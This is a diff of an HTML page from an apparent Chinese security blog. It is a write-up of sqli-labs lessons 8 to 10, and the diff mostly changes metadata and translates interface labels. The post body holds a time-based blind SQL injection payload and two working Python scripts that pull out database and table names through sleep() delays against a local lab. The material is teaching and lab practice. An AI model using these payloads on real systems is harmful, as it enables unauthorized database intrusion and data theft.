@@ -7,13 +7,13 @@
   
   <title>sqlilabs Less8~Less10 writeup | Klaus&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Less-8Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：1https://willardtm.github.io/2018/02/19/sqlilabs-Less-5~6/ Less-9从Less-9的标题可以看出，Less-9是时间盲注，Less-6的时候有写过使用时间盲注的脚本，但是Less-9提升了一点难度，无论怎么都返回的是“You are in">
+  <meta name="description" content="继续注入！">
 <meta name="keywords" content="CTF_Web,SQL_injection">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlilabs Less8~Less10 writeup">
 <meta property="og:url" content="http://yoursite.com/2018/02/20/sqlilabs-Less8-Less10-writeup/index.html">
 <meta property="og:site_name" content="Klaus&#39;s Blog">
-<meta property="og:description" content="Less-8Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：1https://willardtm.github.io/2018/02/19/sqlilabs-Less-5~6/ Less-9从Less-9的标题可以看出，Less-9是时间盲注，Less-6的时候有写过使用时间盲注的脚本，但是Less-9提升了一点难度，无论怎么都返回的是“You are in">
+<meta property="og:description" content="继续注入！">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2018/02/20/5a8b82bf4ff56.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/20/5a8b8a220132f.jpg">
@@ -21,10 +21,10 @@
 <meta property="og:image" content="https://i.loli.net/2018/02/20/5a8b93ca099ca.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/20/5a8be4ecd8d42.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/20/5a8b9690df2cd.jpg">
-<meta property="og:updated_time" content="2018-02-20T09:06:05.699Z">
+<meta property="og:updated_time" content="2018-07-25T08:20:25.597Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlilabs Less8~Less10 writeup">
-<meta name="twitter:description" content="Less-8Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：1https://willardtm.github.io/2018/02/19/sqlilabs-Less-5~6/ Less-9从Less-9的标题可以看出，Less-9是时间盲注，Less-6的时候有写过使用时间盲注的脚本，但是Less-9提升了一点难度，无论怎么都返回的是“You are in">
+<meta name="twitter:description" content="继续注入！">
 <meta name="twitter:image" content="https://i.loli.net/2018/02/20/5a8b82bf4ff56.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Klaus&#39;s Blog" type="application/atom+xml">
@@ -65,9 +65,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -102,7 +102,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><img src="https://i.loli.net/2018/02/20/5a8b82bf4ff56.jpg" alt=""><br>Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
+        <p>继续注入！<br><a id="more"></a></p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><img src="https://i.loli.net/2018/02/20/5a8b82bf4ff56.jpg" alt=""><br>Less-8做法和Less-5完全一样，加单引号绕过，还是盲注，这里可以参考之前的博客：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p><img src="https://i.loli.net/2018/02/20/5a8b8a220132f.jpg" alt=""><br>从Less-9的标题可以看出，Less-9是时间盲注，Less-6的时候有写过使用时间盲注的脚本，但是Less-9提升了一点难度，无论怎么都返回的是“You are in”，并且这里是单引号注入，所以这里需要对脚本进行相关修改。<br>首先对数据库长度进行测试：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/<span class="keyword">Less</span>-<span class="number">9</span>/?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">If</span>(length(database())=<span class="number">5</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
 <p>F12查看元素发现时间为6.12s<br><img src="https://i.loli.net/2018/02/20/5a8b93ca041dc.jpg" alt=""><br>当测试到数据库长度为8的时候，时间返回为1.10s，说明这里并没有进行延时，所以数据库长度为8。<br><img src="https://i.loli.net/2018/02/20/5a8b93ca099ca.jpg" alt=""><br>写脚本的时候和Less-6比起来的改动只在于加入了一个time块来比较当前时间和运行时间的间隔，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Because sometimes some page will return the same content weather the input is different.</span></span><br><span class="line"><span class="string">That's why I write this program to detect the right information.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	r=requests.session()</span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-9/?id=1' "</span>+payload</span><br><span class="line">	start_time=time.time()</span><br><span class="line">	r.post(url)</span><br><span class="line">	<span class="keyword">if</span> time.time()-start_time &lt;<span class="number">5</span>:</span><br><span class="line">		<span class="comment">#if time don't delay 5 seconds,which means right</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_length</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if(length(database())="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of databse is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890_abcdefghijklmnopqrstuvwxyz@ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	db_length=get_db_length()</span><br><span class="line">	<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">			<span class="comment">#Because the database's name count from number 1,length add 1.</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				payload=<span class="string">"and If(ascii(substr(database(),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">				<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">					result+=char</span><br><span class="line">					<span class="keyword">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
 <p>之前好几次CTF比赛上都遇到了这类题目，但是由于当时确实不会这个东西而且嫌麻烦又不想学……脚本跑出来也相当费时…<br>好吧，继续，再列一次表，后面的操作大同小异而已。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	r=requests.session()</span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-9/?id=1' "</span>+payload</span><br><span class="line">	start_time=time.time()</span><br><span class="line">	r.post(url)</span><br><span class="line">	<span class="keyword">if</span> time.time()-start_time &lt;<span class="number">5</span>:</span><br><span class="line">		<span class="comment">#if time don't delay 5 seconds,which means right</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if((select count(*) from information_schema.tables where table_schema=database())="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The number of table is"</span>,i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(j)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if((select length(table_name) from information_schema.tables where table_schema=database() limit "</span>+str(j)+<span class="string">",1)="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of table is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		db_length=get_table_length(i)</span><br><span class="line">		<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">					payload=<span class="string">"and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">					<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">						result+=char</span><br><span class="line">						<span class="comment">#print result</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_table_num()</span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
@@ -112,7 +113,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/20/sqlilabs-Less8-Less10-writeup/" data-id="cjk0t3vep00199cv4ve5yu9nq" class="article-share-link">Compartir</a>
+      <a data-url="http://yoursite.com/2018/02/20/sqlilabs-Less8-Less10-writeup/" data-id="cjk0upeks0015okv4p5m7fwnh" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li></ul>
@@ -124,7 +125,7 @@
 <nav id="article-nav">
   
     <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Nuevo</strong>
+      <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
           HGAME2018 Week-2 Web Writeup
@@ -134,7 +135,7 @@
   
   
     <a href="/2018/02/19/sqlilab-Less-7-writeup/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Viejo</strong>
+      <strong class="article-nav-caption">Older</strong>
       <div class="article-nav-title">sqlilabs Less-7 writeup</div>
     </a>
   
@@ -149,7 +150,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categorías</h3>
+    <h3 class="widget-title">Categories</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI-Learning/">AI_Learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS漏洞学习/">XSS漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li></ul>
     </div>
@@ -169,7 +170,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Nube de Tags</h3>
+    <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
       <a href="/tags/Algorithm/" style="font-size: 13.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF-Web/" style="font-size: 20px;">CTF_Web</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/NLP/" style="font-size: 10px;">NLP</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/SQL-injection/" style="font-size: 16.67px;">SQL_injection</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/凸包算法/" style="font-size: 10px;">凸包算法</a> <a href="/tags/大数据/" style="font-size: 10px;">大数据</a> <a href="/tags/微信小程序/" style="font-size: 10px;">微信小程序</a> <a href="/tags/杂谈/" style="font-size: 10px;">杂谈</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/算法考核/" style="font-size: 10px;">算法考核</a>
     </div>
@@ -178,7 +179,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archivos</h3>
+    <h3 class="widget-title">Archives</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
     </div>
@@ -188,7 +189,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Posts recientes</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
@@ -225,7 +226,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 Klaus<br>
-      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
